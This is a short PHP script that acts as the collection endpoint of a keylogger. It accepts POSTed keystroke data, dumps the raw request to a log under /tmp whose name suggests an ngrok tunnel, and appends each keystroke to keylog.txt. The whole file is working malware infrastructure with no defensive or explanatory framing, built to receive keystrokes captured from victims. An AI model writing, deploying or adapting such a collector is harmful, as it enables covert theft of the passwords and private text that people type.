<?php

file_put_contents('/tmp/ngroktest.log',json_encode($_POST));

$file = fopen("keylog.txt","a+");

//save keystrokes

$keys = json_decode($_POST['keys']);

foreach ($keys as $k=>$v){
    fwrite($file,$v . PHP_EOL);
}

fclose($file);

echo "OK";

?>